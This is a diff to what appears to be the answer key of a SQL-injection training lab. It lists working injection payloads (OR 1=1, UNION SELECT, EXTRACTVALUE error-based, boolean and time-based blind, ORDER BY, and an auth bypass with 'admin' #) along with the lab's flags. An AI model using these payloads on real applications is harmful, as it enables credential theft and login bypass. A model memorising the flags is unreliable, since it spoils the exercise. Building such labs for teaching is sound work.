@@ -36,9 +36,9 @@ id, name, email, message
 | 1 | Easy | In-band numeric SQLi | `list-task.php?list_id=1 OR 1=1` | Dump all tasks — hidden task description contains flag |
 | 2 | Easy | In-band string SQLi | `search.php?q=' OR '1'='1` | Dump all tasks — another hidden task description |
 | 3 | Medium | UNION SELECT | `search.php?q=' UNION SELECT 1,username,token,4,5,6 FROM tbl_users -- -` | Cross-table UNION displays admin token in results |
-| 4 | Medium | Error-based (EXTRACTVALUE) | `search.php?q=' OR EXTRACTVALUE(1, CONCAT(0x7e,(SELECT token FROM tbl_users WHERE role="admin"))) OR '1'='1` | MySQL error leaks admin token in XPATH error |
-| 5 | Hard | Boolean blind | `user-check.php?id=1 AND (SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D'` | Boolean oracle — "User found" vs "User not found" |
-| 6 | Hard | Time-based blind | `list-task.php?list_id=1 AND IF((SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D',SLEEP(2),0)` | ~2s delay if true, instant if false |
+| 4 | Medium | Error-based (EXTRACTVALUE) | `search.php?q=' OR EXTRACTVALUE(1, CONCAT(0x7e,(SELECT token FROM tbl_users WHERE username="staff"))) OR '1'='1` | MySQL error leaks staff token in XPATH error |
+| 5 | Hard | Boolean blind | `user-check.php?id=1 AND (SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='intern')='D'` | Boolean oracle — "User found" vs "User not found" for intern token |
+| 6 | Hard | Time-based blind | `list-task.php?list_id=1 AND IF((SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='contractor')='t',SLEEP(2),0)` | ~2s delay if true, instant if false for contractor token |
 | 7 | Easy | Auth Bypass | `login.php` username input | `admin' #` bypasses authentication |
 | 8 | Medium | UNION SELECT | `profile.php?user_id=1 UNION SELECT 1,token,3 FROM tbl_users WHERE username='manager' -- -` | Cross-table UNION displays manager token |
 | 9 | Hard | ORDER BY SQLi | `index.php?sort=(SELECT IF(SUBSTRING(secret_value,1,1)='D',SLEEP(2),0) FROM tbl_secrets WHERE secret_key='order_by_flag')` | ~2s delay if true |
@@ -51,9 +51,9 @@ id, name, email, message
 | 1 | `DBS401{n0t_s0_h4rd_t0_f1nd}` | Numeric OR | `list-task.php?list_id=1 OR 1=1` — hidden task description (tbl_tasks) |
 | 2 | `DBS401{s3Arch_n0t_s0_s3cur3}` | String OR | `search.php?q=' OR '1'='1` — hidden task description (tbl_tasks) |
 | 3 | `DBS401{un10n_1s_p0w3rful}` | UNION SELECT | `search.php` — admin token from tbl_users |
-| 4 | `DBS401{bl1nd_but_n0t_mute}` | Error-based | `search.php` — staff token via EXTRACTVALUE error |
-| 5 | `DBS401{bl1nd_but_n0t_mute}` | Boolean blind | `user-check.php?id=` — staff token, char by char |
-| 6 | `DBS401{bl1nd_but_n0t_mute}` | Time-based blind | `list-task.php?list_id=` — staff token, char by char |
+| 4 | `DBS401{3rr0r_b4s3d_m4st3r}` | Error-based | `search.php` — staff token via EXTRACTVALUE error |
+| 5 | `DBS401{b00l34n_bl1nd_pr0}` | Boolean blind | `user-check.php?id=` — intern token, char by char |
+| 6 | `DBS401{t1m3_1s_1lus10n}` | Time-based blind | `list-task.php?list_id=` — contractor token, char by char |
 | 7 | `DBS401{byp4ss_auth_w1th_sql1}` | Auth Bypass | `login.php` — hardcoded in script on successful admin login |
 | 8 | `DBS401{un10n_strik3s_b4ck}` | UNION SELECT | `profile.php?user_id=` — manager token from tbl_users |
 | 9 | `DBS401{0rd3r_by_1nj3ct10n}` | ORDER BY | `index.php?sort=` — from tbl_secrets via boolean blind time-based |
